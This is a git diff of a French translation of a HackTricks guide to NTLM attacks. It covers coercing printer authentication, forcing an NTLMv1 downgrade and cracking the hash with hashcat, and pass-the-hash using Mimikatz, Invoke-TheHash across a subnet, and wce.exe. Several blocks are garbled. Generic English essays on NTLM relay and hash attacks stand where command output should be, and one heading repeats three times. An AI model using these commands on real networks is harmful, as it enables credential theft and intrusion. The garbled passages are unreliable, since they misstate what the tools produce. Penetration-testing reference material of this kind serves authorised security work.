@@ -4,11 +4,11 @@
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité**? Vous voulez voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -37,15 +37,15 @@ Vous pouvez vérifier et configurer quel protocole sera utilisé :
 
 Exécutez _secpol.msc_ -> Stratégies locales -> Options de sécurité -> Sécurité réseau : Niveau d'authentification LAN Manager. Il y a 6 niveaux (de 0 à 5).
 
-![](<../../.gitbook/assets/image (916).png>)
+![](<../../.gitbook/assets/image (919).png>)
 
 ### Registre
 
-Cela définira le niveau 5:
+Cela définira le niveau 5 :
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
-Valeurs possibles :
+### Valeurs possibles:
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -85,9 +85,9 @@ Le **hachage NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (
 
 ### Attaque NTLMv1
 
-De nos jours, il est de moins en moins courant de trouver des environnements avec une Délégation non contrainte configurée, mais cela ne signifie pas que vous ne pouvez pas **abuser d'un service de spouleur d'impression** configuré.
+De nos jours, il est de moins en moins courant de trouver des environnements configurés avec une Délégation sans contrainte, mais cela ne signifie pas que vous ne pouvez pas **abuser d'un service de spouleur d'impression** configuré.
 
-Vous pourriez abuser de certaines informations d'identification/sessions que vous avez déjà sur l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification sur 1122334455667788**, capturer la tentative d'authentification, et si elle a été effectuée en utilisant **NTLMv1**, vous pourrez la **craquer**.\
+Vous pourriez abuser de certaines informations d'identification/sessions que vous avez déjà dans l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification sur 1122334455667788**, capturer la tentative d'authentification, et si elle a été effectuée en utilisant **NTLMv1**, vous pourrez la **craquer**.\
 Si vous utilisez `responder`, vous pourriez essayer d'utiliser le drapeau `--lm` pour tenter de **réduire** l'**authentification**.\
 _Notez que pour cette technique, l'authentification doit être effectuée en utilisant NTLMv1 (NTLMv2 n'est pas valide)._
 
@@ -101,29 +101,29 @@ La commande
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
+```markdown
 ## NTLM Relay Attack
 
 ### Introduction
 
-NTLM relay attacks are a common technique used by attackers to escalate privileges within a network. This attack involves intercepting NTLM authentication traffic and relaying it to a target server to gain unauthorized access.
-
-### How it Works
-
-1. The attacker intercepts NTLM authentication traffic between a client and a server.
-2. The attacker relays this traffic to another server within the network.
-3. The target server receives the relayed authentication request, believing it is coming from the original client.
-4. If successful, the attacker gains unauthorized access to the target server using the intercepted credentials.
+NTLM relay attacks are a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic between a client and a server, and then relaying it to another server to gain unauthorized access.
 
 ### Mitigation
 
-To mitigate NTLM relay attacks, consider implementing the following measures:
+To mitigate NTLM relay attacks, it is recommended to implement the following security measures:
 
-- **Enforce SMB Signing:** Require SMB signing to prevent tampering with authentication traffic.
-- **Enable Extended Protection for Authentication:** Helps protect against NTLM relay attacks by requiring channel binding tokens.
-- **Use LDAP Signing and Channel Binding:** Helps protect LDAP traffic from relay attacks.
-- **Implement Credential Guard:** Helps protect against credential theft and relay attacks by storing credentials securely.
+1. **Enforce SMB Signing**: By enabling SMB signing, you can protect against tampering with NTLM authentication traffic.
 
-By implementing these measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.
+2. **Enable LDAP Signing**: LDAP signing helps prevent man-in-the-middle attacks that can be used to relay NTLM authentication.
+
+3. **Disable NTLMv1**: NTLMv1 is vulnerable to various attacks, including relay attacks. It is recommended to disable NTLMv1 and use NTLMv2 or Kerberos instead.
+
+4. **Implement Extended Protection for Authentication**: This feature helps protect against NTLM relay attacks by requiring extended protection for authentication.
+
+5. **Use Group Policy**: Configure Group Policy settings to enforce the above security measures across all Windows machines in the network.
+
+By implementing these security measures, you can significantly reduce the risk of NTLM relay attacks in your Windows environment.
+```
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -149,19 +149,26 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-# NTLM Hash Leaking
+# NTLM Hashes
 
-## Description
+## Introduction
 
-NTLM hash leaking is a technique used to extract NTLM hashes from a compromised system. These hashes can then be cracked offline to obtain the plaintext passwords.
+NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. NTLM hashes are commonly targeted by attackers for password cracking and lateral movement within a network.
 
-## Detection
+## Extracting NTLM Hashes
 
-Detecting NTLM hash leaking can be challenging since it often involves monitoring network traffic or system logs for suspicious activities related to NTLM authentication.
+To extract NTLM hashes from a Windows system, tools like Mimikatz can be used. Mimikatz is a powerful post-exploitation tool that can dump NTLM hashes from memory or from the Security Account Manager (SAM) database.
 
-## Prevention
+## Protecting Against NTLM Hash Attacks
 
-To prevent NTLM hash leaking, it is recommended to disable the use of NTLM authentication where possible and instead use more secure authentication mechanisms such as Kerberos. Additionally, enforcing strong password policies and regularly updating systems can help mitigate the risk of NTLM hash leaking.
+To protect against NTLM hash attacks, it is recommended to implement the following security measures:
+
+1. **Disable NTLM**: Disable the use of NTLM where possible and favor more secure authentication protocols like Kerberos.
+2. **Enforce Complex Passwords**: Encourage users to use complex and unique passwords to make password cracking more difficult.
+3. **Enable SMB Signing**: Enabling SMB signing can help prevent attackers from relaying NTLM authentication attempts.
+4. **Monitor Event Logs**: Regularly monitor event logs for suspicious activities related to NTLM authentication.
+
+By following these best practices, organizations can better protect their systems and data from NTLM hash attacks.
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
@@ -170,7 +177,7 @@ Exécutez hashcat (la distribution est meilleure via un outil tel que hashtopoli
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-Dans ce cas, nous savons que le mot de passe est "password", donc nous allons tricher à des fins de démonstration :
+Dans ce cas, nous savons que le mot de passe est password, donc nous allons tricher à des fins de démonstration :
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -193,27 +200,21 @@ Enfin la dernière partie :
 
 586c # this is the last part
 ```
-### NTLM Relay Attack
+### NTLM
 
-#### Overview
+---
 
-NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. This attack involves relaying NTLM authentication messages from a victim machine to a target machine, allowing the attacker to impersonate the victim and gain unauthorized access to the target system.
+#### NTLM Relay Attack
 
-#### How it works
+---
 
-1. The attacker intercepts an NTLM authentication request from a victim machine to a server.
-2. The attacker relays this request to a target machine.
-3. The target machine mistakenly authenticates the attacker as the victim.
-4. The attacker gains unauthorized access to the target machine.
+#### NTLM Relay Attack
 
-#### Mitigation
+---
 
-To prevent NTLM relay attacks, it is recommended to:
-- Use SMB signing to prevent message tampering.
-- Implement Extended Protection for Authentication to prevent relaying of credentials.
-- Disable NTLM authentication in favor of more secure protocols like Kerberos.
+#### Attaque de relais NTLM
 
-By implementing these measures, organizations can significantly reduce the risk of NTLM relay attacks and enhance the security of their systems.
+---
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
@@ -230,7 +231,7 @@ Si vous avez un **pcap qui a capturé un processus d'authentification réussi**,
 ## Pass-the-Hash
 
 **Une fois que vous avez le hachage de la victime**, vous pouvez l'utiliser pour **l'impersonner**.\
-Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hachage**, **ou** vous pourriez créer une nouvelle **sessionlogon** et **injecter** ce **hachage** dans le **LSASS**, ainsi lorsque toute **authentification NTLM est effectuée**, ce **hachage sera utilisé.** La dernière option est ce que fait mimikatz.
+Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hachage**, **ou** vous pourriez créer une nouvelle **sessionlogon** et **injecter** ce **hachage** à l'intérieur du **LSASS**, ainsi lorsque toute **authentification NTLM est effectuée**, ce **hachage sera utilisé.** La dernière option est ce que fait mimikatz.
 
 **N'oubliez pas que vous pouvez également effectuer des attaques Pass-the-Hash en utilisant des comptes d'ordinateur.**
 
@@ -240,7 +241,7 @@ Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM 
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz mais internement dans LSASS, les informations d'identification enregistrées sont celles à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly` mais vous n'avez pas besoin de connaître le mot de passe en texte clair).
+Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz mais en interne dans LSASS, les informations d'identification enregistrées sont celles à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly` mais vous n'avez pas besoin de connaître le mot de passe en clair).
 
 ### Pass-the-Hash depuis linux
 
@@ -284,7 +285,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l'**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l'une quelconque** des options **SMBExec** et **WMIExec** mais que vous ne fournissez aucun paramètre _**Command**_, il vérifiera simplement si vous avez **suffisamment de permissions**.
+Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l'**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l'une quelconque** des options **SMBExec** et **WMIExec** mais que vous ne fournissez aucun paramètre _**Commande**_, il se contentera de **vérifier** si vous avez **suffisamment de permissions**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -298,7 +299,7 @@ Cet outil fera la même chose que mimikatz (modifier la mémoire LSASS).
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-### Exécution à distance manuelle sur Windows avec nom d'utilisateur et mot de passe
+### Exécution à distance manuelle de Windows avec nom d'utilisateur et mot de passe
 
 {% content-ref url="../lateral-movement/" %}
 [lateral-movement](../lateral-movement/)
@@ -325,9 +326,9 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
